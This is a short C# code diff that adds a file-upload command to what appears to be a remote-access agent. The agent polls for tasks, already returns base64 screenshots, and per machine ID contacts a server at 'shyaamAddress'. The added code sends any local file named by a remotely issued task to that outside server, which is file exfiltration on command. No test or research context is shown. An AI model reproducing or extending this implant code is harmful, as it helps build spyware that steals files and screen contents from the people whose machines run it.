@@ -107,6 +107,12 @@ namespace raju
             }
         }
 
+        private void UploadAsync(string path)
+        {
+            WebClient juice = new WebClient();
+            juice.UploadFileAsync(new Uri(shyaamAddress + "shyaam/" + machineID + "/upload"), path);
+        }
+
         private void SetupTimers()
         {
             queueCheckTimer = new System.Timers.Timer(3000);
@@ -216,6 +222,9 @@ namespace raju
                     break;
                 case "screenshot":
                     data.Add("body", Base64Screenshot());
+                    break;
+                case "upload":
+                    UploadAsync(inputTask.Value<JArray>("path").First.Value<String>());
                     break;
                 default:
                     Console.WriteLine("Invalid Task");
